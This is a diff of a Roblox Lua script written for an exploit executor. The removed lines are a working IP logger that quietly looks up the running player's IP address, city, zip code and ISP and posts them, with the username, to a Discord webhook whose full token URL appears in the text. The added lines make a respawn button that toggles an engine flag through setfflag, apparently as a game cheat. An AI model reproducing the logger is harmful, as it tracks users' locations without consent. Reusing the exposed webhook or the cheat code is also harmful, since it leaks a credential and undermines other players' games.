@@ -1,24 +1,42 @@
-local requestfunc = (syn and syn.request) or (http and http.request) or http_request or request
-if not requestfunc then
-    error("No HTTP request function found! Your exploit may not support this.")
+local player = game.Players.LocalPlayer
+local screenGui = player:WaitForChild("PlayerGui"):FindFirstChild("ScreenGui")
+
+if not screenGui then
+    screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "RespawnGui"
+    screenGui.Parent = player.PlayerGui
 end
 
-local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1381333725832286350/HFbWhUTZkVjwZhlyjzgP_pofeAjiGffP73wU2N0LpCQxQlkr9SPJ9qCbOl6RhCyJcH4b"
+local button = Instance.new("TextButton")
+button.Name = "RespawnButton"
+button.Size = UDim2.new(0, 200, 0, 50)
+button.Position = UDim2.new(0.5, -100, 0, 20)
+button.AnchorPoint = Vector2.new(0.5, 0)
+button.Text = "RESPAWN"
+button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.GothamBold
+button.TextSize = 14
+button.Parent = screenGui
 
-local ip_info = requestfunc({
-    Url = "http://ip-api.com/json",
-    Method = "GET"
-})
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-requestfunc(
-    {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-    }
-)
+button.MouseButton1Click:Connect(function()
+    button.Text = "RESPAWNING..."
+    button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    button.AutoButtonColor = false
+    
+    setfflag("NextGenReplicatorEnabledWrite4", "false")
+    task.wait(0.1)
+    setfflag("NextGenReplicatorEnabledWrite4", "true")
+    
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999999, 0)
+    end
+    
+    task.wait(1)
+    player:LoadCharacter()
+    
+    task.wait(1)
+    button.Text = "RESPAWN"
+    button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    button.AutoButtonColor = true
+end)
